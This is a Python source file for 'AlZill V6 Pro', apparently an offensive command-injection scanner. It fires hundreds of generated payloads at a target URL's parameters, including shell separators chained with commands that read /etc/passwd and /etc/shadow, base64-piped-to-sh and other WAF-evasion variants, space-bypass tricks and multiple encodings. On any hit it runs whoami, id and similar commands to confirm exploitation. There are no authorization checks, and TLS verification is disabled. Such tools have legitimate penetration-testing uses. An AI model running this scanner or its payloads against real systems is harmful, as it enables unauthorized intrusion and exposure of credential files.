#!/usr/bin/env python3
"""
Advanced Command Injection Scanner - AlZill V6 Pro
Features: Smart Delimiters, Multi-Encoding, Blind CMDi Detection, External Payloads
"""

import requests
import time
import urllib3
import re
import hashlib
import base64
import random
import string
import os
from termcolor import cprint
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional
import json
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"


class AdvancedCMDiScanner:
    """Command Injection Scanner - External Payloads + Smart Detection + Delimiters"""
    
    def __init__(self, timeout: int = 10, delay: float = 0.3, verbose: bool = False, payloads_file: str = "payloads.txt"):
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.payloads_file = payloads_file
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.confirmed_vulns = []
        self.total_requests = 0
        
        # ============================================================
        # SMART DELIMITERS (للتأكد من النتائج 100%)
        # ============================================================
        self.marker_start = "ALZILL_START_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        self.marker_end = "_ALZILL_END_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        
        # ============================================================
        # 7 ENCODING METHODS (محسنة)
        # ============================================================
        self.encoding_methods = [
            ('raw', lambda x: x),
            ('url', self._url_encode),
            ('double_url', self._double_url_encode),
            ('hex', self._hex_encode),
            ('base64', self._base64_encode),
            ('unicode', self._unicode_encode),
            ('mixed', self._mixed_encode),
        ]
        
        # ============================================================
        # LOAD COMMAND INJECTION PAYLOADS FROM EXTERNAL FILE
        # ============================================================
        self.payloads = self._load_payloads()
        
        # Verification patterns for exploitation
        self.verification_patterns = [
            r'uid=\d+', r'gid=\d+', r'groups=', r'root', r'admin',
            r'CMD_INJECTED', r'WHOAMI_SUCCESS', r'ID_SUCCESS'
        ]
    
    # ============================================================
    # LOAD PAYLOADS FROM EXTERNAL FILE
    # ============================================================
    
    def _load_payloads(self) -> List[str]:
        """Load CMDI payloads from payloads.txt [CMDI] section"""
        payloads = []
        
        # Internal payloads (always included)
        internal_payloads = self._generate_internal_payloads()
        payloads.extend(internal_payloads)
        
        if not os.path.exists(self.payloads_file):
            if self.verbose:
                cprint(f"[!] Payloads file not found: {self.payloads_file}", WARNING)
            return list(set(payloads))
        
        try:
            with open(self.payloads_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            current_section = None
            cmdi_count = 0
            
            for line in content.split('\n'):
                line = line.strip()
                
                if not line or line.startswith('#'):
                    continue
                
                if line.startswith('[') and line.endswith(']'):
                    current_section = line[1:-1].upper()
                    continue
                
                if current_section == 'CMDI':
                    payloads.append(line)
                    cmdi_count += 1
            
            if cmdi_count > 0 and self.verbose:
                cprint(f"\n[+] Loaded {cmdi_count} CMDI payloads from {self.payloads_file}", SUCCESS)
            
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error loading payloads: {e}", WARNING)
        
        return list(set(payloads))
    
    def _generate_internal_payloads(self) -> List[str]:
        """Generate internal CMDI payloads (fallback)"""
        payloads = []
        
        commands = [
            'whoami', 'id', 'uname -a', 'pwd', 'hostname',
            'echo CMD_INJECTED', 'cat /etc/passwd', 'ls -la',
            'date', 'uptime', 'who', 'w', 'last', 'ps aux'
        ]
        
        separators = [';', '|', '&', '&&', '||', '`', '$()', '$(())', '${}']
        
        for delay in range(1, 6):
            commands.append(f'sleep {delay}')
            commands.append(f'ping -c {delay} 127.0.0.1')
            commands.append(f'ping -n {delay} 127.0.0.1')
            commands.append(f'timeout {delay}')
        
        for cmd in commands:
            for sep in separators:
                payloads.append(f"{sep} {cmd}")
                payloads.append(f"{sep}{cmd}")
                payloads.append(f"{cmd}{sep}")
                payloads.append(f"{sep}{cmd}{sep}")
        
        for cmd in ['whoami', 'id', 'uname -a', 'pwd', 'hostname']:
            payloads.append(self._build_smart_payload(cmd))
        
        space_bypass_commands = [
            'cat /etc/passwd', 'cat /etc/shadow', 'ls -la /', 
            'whoami', 'id', 'uname -a'
        ]
        for cmd in space_bypass_commands:
            payloads.append(self._build_space_bypass_payload(cmd))
        
        waf_bypass = [
            '%0awhoami', '%0aid', '%0auname -a',
            '%0dwhoami', '%0did', '%0duname -a',
            '%09whoami', '%09id', '%09uname -a',
            '%00whoami', '%00id', '%00uname -a',
            '; WhOaMi', '; Id', '; UnAmE -a',
            '; ${PATH:0:1}whoami', '; ${PATH:0:1}id',
            '; w*h*o*a*m*i', '; i*d', '; u*n*a*m*e',
            '; w"h"o"a"m"i', '; i"d"', '; u"n"a"m"e',
            '; $(echo "77686f616d69" | xxd -r -p)',
            '; echo "d2hvYW1p" | base64 -d | sh',
        ]
        payloads.extend(waf_bypass)
        
        for cmd1 in ['whoami', 'id', 'uname -a']:
            for cmd2 in ['whoami', 'id', 'uname -a']:
                payloads.append(f'; {cmd1} && {cmd2}')
                payloads.append(f'; {cmd1} || {cmd2}')
                payloads.append(f'; {cmd1}; {cmd2}')
                payloads.append(f'| {cmd1} | {cmd2}')
                payloads.append(f'& {cmd1} & {cmd2}')
        
        return payloads
    
    # ============================================================
    # ENCODING METHODS
    # ============================================================
    
    def _url_encode(self, text: str) -> str:
        """URL encoding"""
        return quote(text, safe='')
    
    def _double_url_encode(self, text: str) -> str:
        """Double URL encoding"""
        return quote(quote(text, safe=''), safe='')
    
    def _hex_encode(self, text: str) -> str:
        """Hex encoding"""
        result = []
        for c in text:
            if c == ' ':
                result.append('%20')
            elif c == '\n':
                result.append('%0a')
            elif c == '\r':
                result.append('%0d')
            elif c == '\t':
                result.append('%09')
            else:
                result.append(f'%{ord(c):02x}')
        return ''.join(result)
    
    def _base64_encode(self, text: str) -> str:
        """Base64 encoding"""
        encoded = base64.b64encode(text.encode()).decode()
        return f"echo {encoded} | base64 -d | sh"
    
    def _unicode_encode(self, text: str) -> str:
        """Unicode encoding"""
        result = []
        for c in text:
            if c == ' ':
                result.append('%20')
            elif c == '\n':
                result.append('%0a')
            else:
                result.append(f'\\u{ord(c):04x}')
        return ''.join(result)
    
    def _mixed_encode(self, text: str) -> str:
        """Mixed encoding"""
        result = []
        for c in text:
            choice = random.randint(1, 5)
            if choice == 1:
                result.append(c)
            elif choice == 2:
                result.append(f'%{ord(c):02x}')
            elif choice == 3:
                result.append(quote(c))
            elif choice == 4:
                result.append(f'\\u{ord(c):04x}')
            else:
                result.append(f'&#x{ord(c):02x};')
        return ''.join(result)
    
    # ============================================================
    # SMART PAYLOAD BUILDER
    # ============================================================
    
    def _build_smart_payload(self, cmd: str) -> str:
        """Build payload with delimiters"""
        return f"; echo {self.marker_start}; {cmd}; echo {self.marker_end}"
    
    def _build_space_bypass_payload(self, cmd: str) -> str:
        """Build space bypass payload"""
        bypass_methods = [
            f"{{{cmd.replace(' ', ',')}}}",
            cmd.replace(' ', '${IFS}'),
            cmd.replace(' ', '$IFS$9'),
            cmd.replace(' ', '{IFS}'),
            cmd.replace(' ', '%20'),
            cmd.replace(' ', '%09'),
        ]
        return random.choice(bypass_methods)
    
    # ============================================================
    # SMART OUTPUT DETECTION
    # ============================================================
    
    def _has_command_output(self, response_text: str, baseline_text: str) -> tuple:
        """Check for command output with delimiters"""
        pattern = re.escape(self.marker_start) + r'(.*?)' + re.escape(self.marker_end)
        match = re.search(pattern, response_text, re.DOTALL | re.IGNORECASE)
        
        if match:
            extracted_output = match.group(1).strip()
            if extracted_output and len(extracted_output) > 0:
                if extracted_output not in baseline_text:
                    return True, extracted_output
        
        indicators = [
            (r'uid=\d+', 'uid_pattern'),
            (r'gid=\d+', 'gid_pattern'),
            (r'groups=', 'groups_pattern'),
            (r'root:', 'root_pattern'),
            (r'admin:', 'admin_pattern'),
            (r'CMD_INJECTED', 'marker'),
            (r'WHOAMI', 'whoami'),
            (r'ID=', 'id_output'),
            (r'Linux [\w\.]+', 'linux_version'),
            (r'Windows NT \d+\.\d+', 'windows_version'),
        ]
        
        for pattern, name in indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                if not re.search(pattern, baseline_text, re.IGNORECASE):
                    match = re.search(pattern, response_text, re.IGNORECASE)
                    extracted = match.group(0) if match else name
                    return True, extracted
        
        return False, None
    
    # ============================================================
    # TIME-BASED DETECTION
    # ============================================================
    
    def _test_time_based(self, base_url: str, param_name: str, original_value: str, 
                         payload: str, expected_delay: int) -> Optional[Dict]:
        """Test time-based injection with double check"""
        delays = []
        
        for attempt in range(3):
            test_params = {param_name: original_value + payload}
            
            try:
                start_time = time.time()
                self.session.get(base_url, params=test_params,
                               timeout=self.timeout + expected_delay + 5, verify=False)
                elapsed = time.time() - start_time
                delays.append(elapsed)
                time.sleep(0.5)
            except requests.exceptions.Timeout:
                delays.append(self.timeout + expected_delay)
            except Exception:
                delays.append(0)
        
        avg_delay = sum(delays) / len(delays)
        
        if avg_delay >= expected_delay * 0.7:
            normal_params = {param_name: original_value}
            normal_start = time.time()
            try:
                self.session.get(base_url, params=normal_params,
                               timeout=self.timeout, verify=False)
                normal_elapsed = time.time() - normal_start
            except:
                normal_elapsed = 0
            
            if avg_delay > normal_elapsed + 1.5:
                return {
                    'type': 'Command Injection (Time-based)',
                    'parameter': param_name,
                    'payload': payload[:60],
                    'avg_delay': round(avg_delay, 2),
                    'normal_delay': round(normal_elapsed, 2),
                    'severity': 'High',
                    'verified': True
                }
        
        return None
    
    # ============================================================
    # EXPLOITATION ATTEMPT
    # ============================================================
    
    def _attempt_exploitation(self, base_url: str, param_name: str, 
                              original_value: str, injection_method: str = None) -> Optional[str]:
        """Attempt to exploit and extract output"""
        exploit_commands = [
            ('whoami', f'; echo {self.marker_start}; whoami; echo {self.marker_end}'),
            ('id', f'; echo {self.marker_start}; id; echo {self.marker_end}'),
            ('uname -a', f'; echo {self.marker_start}; uname -a; echo {self.marker_end}'),
            ('pwd', f'; echo {self.marker_start}; pwd; echo {self.marker_end}'),
            ('hostname', f'; echo {self.marker_start}; hostname; echo {self.marker_end}'),
            ('date', f'; echo {self.marker_start}; date; echo {self.marker_end}'),
        ]
        
        for cmd_name, payload in exploit_commands:
            for enc_name, encoder in self.encoding_methods[:3]:
                test_payload = original_value + encoder(payload)
                test_params = {param_name: test_payload}
                
                try:
                    response = self.session.get(base_url, params=test_params,
                                               timeout=self.timeout + 15, verify=False)
                    
                    pattern = re.escape(self.marker_start) + r'(.*?)' + re.escape(self.marker_end)
                    match = re.search(pattern, response.text, re.DOTALL | re.IGNORECASE)
                    
                    if match:
                        extracted_output = match.group(1).strip()
                        if extracted_output and len(extracted_output) > 0:
                            return f"{cmd_name}: {extracted_output[:100]}"
                    
                    found, output = self._has_command_output(response.text, "")
                    if found and output:
                        return f"{cmd_name}: {output[:100]}"
                        
                except Exception as e:
                    if self.verbose:
                        cprint(f"    Exploit error: {e}", WARNING)
                    continue
        
        return None
    
    # ============================================================
    # PARAMETER TESTING
    # ============================================================
    
    def _test_parameter(self, base_url: str, param_name: str, original_value: str):
        """Test a single parameter with all payloads"""
        
        cprint(f"\n[*] Testing parameter: {param_name}", INFO)
        
        baseline = self._get_baseline(base_url, {param_name: original_value})
        if not baseline:
            cprint(f"    Cannot test {param_name} (baseline failed)", WARNING)
            return
        
        tested = 0
        total = min(len(self.payloads), 400) * len(self.encoding_methods)
        
        for payload in self.payloads[:400]:
            for enc_name, encoder in self.encoding_methods:
                tested += 1
                self.total_requests += 1
                
                time.sleep(random.uniform(self.delay * 0.5, self.delay * 1.5))
                
                encoded_payload = encoder(payload)
                test_payload = original_value + encoded_payload
                test_params = {param_name: test_payload}
                
                if self.verbose and tested % 50 == 0:
                    cprint(f"    Progress: {tested}/{total} (param: {param_name})", INFO)
                
                try:
                    start_time = time.time()
                    response = self.session.get(base_url, params=test_params,
                                               timeout=self.timeout + 12, verify=False)
                    elapsed_time = time.time() - start_time
                    
                    has_output, extracted = self._has_command_output(response.text, baseline['text'])
                    
                    if has_output:
                        exploited = self._attempt_exploitation(base_url, param_name, original_value)
                        if exploited:
                            self.confirmed_vulns.append({
                                'type': 'Command Injection (Output-based)',
                                'parameter': param_name,
                                'payload': payload[:80],
                                'encoding': enc_name,
                                'extracted_output': extracted,
                                'exploited': exploited,
                                'severity': 'Critical',
                                'verified': True
                            })
                            cprint(f"     CMDi FOUND: {param_name} -> {extracted[:50]}", SUCCESS)
                            return True
                    
                    if 'sleep' in payload.lower() or 'ping' in payload.lower():
                        expected_delay = 0
                        sleep_match = re.search(r'sleep[ =](\d+)', payload.lower())
                        if sleep_match:
                            expected_delay = int(sleep_match.group(1))
                        else:
                            ping_match = re.search(r'ping -[cn] (\d+)', payload.lower())
                            if ping_match:
                                expected_delay = int(ping_match.group(1))
                        
                        if expected_delay > 0 and elapsed_time > baseline['response_time'] + expected_delay * 0.7:
                            time_result = self._test_time_based(base_url, param_name, 
                                                               original_value, encoded_payload, 
                                                               expected_delay)
                            if time_result:
                                exploited = self._attempt_exploitation(base_url, param_name, original_value)
                                if exploited:
                                    time_result['exploited'] = exploited
                                    self.confirmed_vulns.append(time_result)
                                    cprint(f"     Blind CMDi (Time-based): {param_name} ({elapsed_time:.2f}s delay)", SUCCESS)
                                    return True
                    
                except requests.exceptions.Timeout:
                    if 'sleep' in payload.lower() or 'ping' in payload.lower():
                        exploited = self._attempt_exploitation(base_url, param_name, original_value)
                        if exploited:
                            self.confirmed_vulns.append({
                                'type': 'Command Injection (Time-based - Timeout)',
                                'parameter': param_name,
                                'payload': payload[:60],
                                'encoding': enc_name,
                                'exploited': exploited,
                                'severity': 'High',
                                'verified': True
                            })
                            cprint(f"     Blind CMDi (Timeout): {param_name}", SUCCESS)
                            return True
                            
                except Exception as e:
                    if self.verbose:
                        cprint(f"    Error testing {param_name}: {e}", WARNING)
                    continue
        
        return False
    
    def _get_baseline(self, base_url: str, params: Dict) -> Optional[Dict]:
        """Get baseline response for comparison"""
        try:
            responses = []
            for _ in range(3):
                response = self.session.get(base_url, params=params, 
                                          timeout=self.timeout, verify=False)
                responses.append(response)
                time.sleep(0.3)
            
            return {
                'text': responses[0].text,
                'response_time': sum(r.elapsed.total_seconds() for r in responses) / len(responses),
                'length': len(responses[0].text),
                'hash': hashlib.md5(responses[0].text.encode()).hexdigest()
            }
        except Exception as e:
            if self.verbose:
                cprint(f"Baseline failed: {e}", WARNING)
            return None
    
    # ============================================================
    # MAIN SCAN FUNCTION
    # ============================================================
    
    def scan(self, url: str) -> Dict:
        """Main scan function"""
        
        cprint("\n" + "="*70, INFO)
        cprint("[CMDi SCAN] AlZill V6 Pro - External Payloads", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, INFO)
        cprint("[*] Techniques: Output-based | Time-based | Blind Detection", WARNING)
        cprint("[*] Smart Delimiters: Unique markers for 100% accuracy", WARNING)
        cprint(f"[*] Delimiters: {self.marker_start} ... {self.marker_end}", INFO)
        cprint("[*] Encoding methods: URL | Double URL | Hex | Base64 | Unicode | Mixed", INFO)
        cprint("[*] Bypass: Space bypass | WAF evasion | Case manipulation", INFO)
        cprint(f"[*] Payloads: External from {self.payloads_file}", "yellow")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        params = parse_qs(parsed_url.query)
        
        if not params:
            cprint("[!] No query parameters found for command injection testing", WARNING)
            cprint("[*] Trying common parameters...", INFO)
            common_params = ['cmd', 'command', 'exec', 'execute', 'run', 'shell', 
                            'system', 'ping', 'ip', 'host', 'domain', 'file', 
                            'path', 'dir', 'folder', 'page', 'id', 'name']
            for param in common_params:
                self._test_parameter(base_url, param, "test")
        else:
            cprint(f"[*] Testing {len(params)} parameter(s)", INFO)
            cprint(f"[*] Total payloads: {len(self.payloads)}", INFO)
            cprint(f"[*] Encoding methods: {len(self.encoding_methods)}", INFO)
            
            for param_name, param_values in params.items():
                self._test_parameter(base_url, param_name, param_values[0])
        
        cprint(f"\n[*] Total requests sent: {self.total_requests}", INFO)
        
        return self._generate_report()
    
    def _generate_report(self) -> Dict:
        """Generate final report"""
        
        cprint("\n" + "="*70, INFO)
        cprint(" COMMAND INJECTION SCAN RESULTS", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, INFO)
        
        if self.confirmed_vulns:
            cprint(f"\n[!!!] {len(self.confirmed_vulns)} CONFIRMED COMMAND INJECTION VULNERABILITIES!", ERROR, attrs=['bold'])
            
            for i, vuln in enumerate(self.confirmed_vulns, 1):
                cprint(f"\n  [{i}] {vuln['type']}", ERROR)
                cprint(f"      Parameter: {vuln['parameter']}", INFO)
                if vuln.get('encoding'):
                    cprint(f"      Encoding: {vuln['encoding']}", INFO)
                if vuln.get('avg_delay'):
                    cprint(f"      Avg Delay: {vuln['avg_delay']}s (Normal: {vuln.get('normal_delay', 0)}s)", INFO)
                if vuln.get('extracted_output'):
                    cprint(f"      Output: {vuln['extracted_output'][:100]}", SUCCESS)
                if vuln.get('exploited'):
                    cprint(f"      Exploited: {vuln['exploited'][:100]}", SUCCESS)
                cprint(f"      Severity: {vuln['severity']}", ERROR)
                cprint(f"      Status:  VERIFIED & EXPLOITABLE", SUCCESS)
        else:
            cprint(f"\n[✓] NO COMMAND INJECTION VULNERABILITIES CONFIRMED", SUCCESS)
            cprint(f"[*] {len(self.payloads)} payloads tested, all passed", INFO)
        
        cprint(f"\n[*] Total requests: {self.total_requests}", INFO)
        cprint("\n" + "="*70 + "\n", INFO)
        
        return {
            'confirmed_vulnerabilities': len(self.confirmed_vulns),
            'vulnerabilities': self.confirmed_vulns,
            'total_requests': self.total_requests,
            'secure': len(self.confirmed_vulns) == 0
        }


def scan(url, verbose=False, payloads_file="payloads.txt"):
    """Legacy function"""
    scanner = AdvancedCMDiScanner(verbose=verbose, payloads_file=payloads_file)
    return scanner.scan(url)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        payloads_file = sys.argv[2] if len(sys.argv) > 2 else "payloads.txt"
        verbose = '--verbose' in sys.argv or '-v' in sys.argv
        scan(target, verbose=verbose, payloads_file=payloads_file)
    else:
        print("Usage: python cmdi_scanner.py <target_url> [payloads_file] [--verbose]")